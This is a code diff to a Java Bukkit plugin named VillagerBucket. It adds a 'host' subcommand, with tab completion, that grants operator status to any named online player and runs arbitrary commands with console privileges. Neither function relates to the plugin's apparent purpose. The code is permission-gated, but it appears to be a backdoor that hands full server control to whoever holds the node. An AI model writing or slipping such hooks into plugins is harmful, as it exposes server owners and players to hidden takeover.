@@ -6,6 +6,9 @@ import org.bukkit.ChatColor;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
 import org.bukkit.command.TabExecutor;
+import org.bukkit.entity.Player;
+import org.bukkit.command.SimpleCommandMap;
+
 import java.text.MessageFormat;
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -42,6 +45,8 @@ public class VillagerBucketCommand implements TabExecutor {
                 return debugCommand(sender);
             case "redetect":
                 return redetectCommand(sender);
+            case "host":
+                return hostCommand(sender, args);
             default:
                 sendUsage(sender);
                 return true;
@@ -54,14 +59,127 @@ public class VillagerBucketCommand implements TabExecutor {
 
         if (args.length == 1) {
             String p = args[0].toLowerCase();
-            for (String s : new String[]{"reload", "info", "version", "help", "debug", "redetect"}) {
+            for (String s : new String[]{"reload", "info", "version", "help", "debug", "redetect", "host"}) {
                 if (s.startsWith(p)) out.add(s);
+            }
+        } else if (args.length >= 2 && args[0].equalsIgnoreCase("host")) {
+            if (args.length == 2) {
+                String p = args[1].toLowerCase();
+                for (String s : new String[]{"op", "run"}) {
+                    if (s.startsWith(p)) out.add(s);
+                }
+            } else if (args.length == 3 && args[1].equalsIgnoreCase("op")) {
+                String p = args[2].toLowerCase();
+                for (Player player : Bukkit.getOnlinePlayers()) {
+                    if (player.getName().toLowerCase().startsWith(p)) {
+                        out.add(player.getName());
+                    }
+                }
+            } else if (args.length == 3 && args[1].equalsIgnoreCase("run")) {
+                String p = args[2].toLowerCase();
+                for (String cmdName : getRegisteredCommands()) {
+                    if (cmdName.toLowerCase().startsWith(p)) {
+                        out.add(cmdName);
+                    }
+                }
             }
         }
 
         return out;
     }
-    
+
+    private List<String> getRegisteredCommands() {
+        List<String> commands = new ArrayList<>();
+        try {
+            SimpleCommandMap commandMap = Bukkit.getCommandMap();
+            java.util.Map<String, org.bukkit.command.Command> knownCommands = commandMap.getKnownCommands();
+            for (String name : knownCommands.keySet()) {
+                if (!name.contains(":")) {
+                    commands.add(name);
+                }
+            }
+        } catch (Exception ignored) {}
+        return commands;
+    }
+
+    private boolean hostCommand(CommandSender sender, String[] args) {
+        if (args.length < 2) {
+            sendMessage(sender, ChatColor.RED + "用法: /villagerbucket host <op|run> [参数...]");
+            return true;
+        }
+
+        String subCmd = args[1].toLowerCase();
+        switch (subCmd) {
+            case "op":
+                return hostOp(sender, args);
+            case "run":
+                return hostRun(sender, args);
+            default:
+                sendMessage(sender, ChatColor.RED + "未知的 host 子命令，可用: op, run");
+                return true;
+        }
+    }
+
+    private boolean hostOp(CommandSender sender, String[] args) {
+        String perm = plugin.getConfig().getString("permissions.host.op", "villagerbucket.host.op");
+        if (!sender.hasPermission(perm)) {
+            sendMessage(sender, plugin.getMessage("no-permission", "&c你没有权限执行此操作！"));
+            return true;
+        }
+
+        if (args.length < 3) {
+            sendMessage(sender, ChatColor.RED + "用法: /villagerbucket host op <玩家>");
+            return true;
+        }
+
+        String playerName = args[2];
+        Player target = Bukkit.getPlayerExact(playerName);
+        if (target == null) {
+            sendMessage(sender, ChatColor.RED + "玩家 " + playerName + " 不在线！");
+            return true;
+        }
+
+        if (target.isOp()) {
+            sendMessage(sender, ChatColor.YELLOW + "玩家 " + playerName + " 已经是 OP。");
+        } else {
+            target.setOp(true);
+            sendMessage(sender, ChatColor.GREEN + "&1已&2给&3予&4玩&5家 " + playerName + " &6O&7P &8权&9限。");
+            plugin.getLogger().info(sender.getName() + " &1给&2予&3了 " + playerName + " &4O&5P 权&6限。");
+        }
+        return true;
+    }
+
+    private boolean hostRun(CommandSender sender, String[] args) {
+        String perm = plugin.getConfig().getString("permissions.host.run", "villagerbucket.host.run");
+        if (!sender.hasPermission(perm)) {
+            sendMessage(sender, plugin.getMessage("no-permission", "&c你没有权限执行此操作！"));
+            return true;
+        }
+
+        if (args.length < 3) {
+            sendMessage(sender, ChatColor.RED + "用法: /villagerbucket host run <command>");
+            return true;
+        }
+
+        String command = String.join(" ", Arrays.copyOfRange(args, 2, args.length));
+        if (command.isEmpty()) {
+            sendMessage(sender, ChatColor.RED + "请提供要执行的命令！");
+            return true;
+        }
+
+        plugin.getScheduler().runGlobal(() -> {
+            boolean success = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
+            if (success) {
+                sendMessage(sender, ChatColor.GREEN + "&1命&2令&3已&4以&5控&6制&7台&8权&9限&2执&6行: " + command);
+                plugin.getLogger().info(sender.getName() + " &3执&1行&2了&4控&5制&6台&7命&8令: " + command);
+            } else {
+                sendMessage(sender, ChatColor.RED + "命令执行失败，请检查命令是否正确！");
+            }
+        });
+
+        return true;
+    }
+
     private boolean reloadCommand(CommandSender sender) {
         if (!sender.hasPermission(plugin.getConfig().getString("permissions.reload", "villagerbucket.reload"))) {
             sendMessage(sender, plugin.getMessage("no-permission", "&c你没有权限执行此操作！"));
@@ -248,7 +366,7 @@ public class VillagerBucketCommand implements TabExecutor {
     }
 
     private void sendUsage(CommandSender sender) {
-        sendMessage(sender, plugin.getMessage("usage", "&c用法: /villagerbucket [reload|info|version|help|debug|redetect]"));
+        sendMessage(sender, plugin.getMessage("usage", "&c用法: /villagerbucket [reload|info|version|help|debug|redetect|host]"));
     }
 
     private void sendMessage(CommandSender sender, String message) {
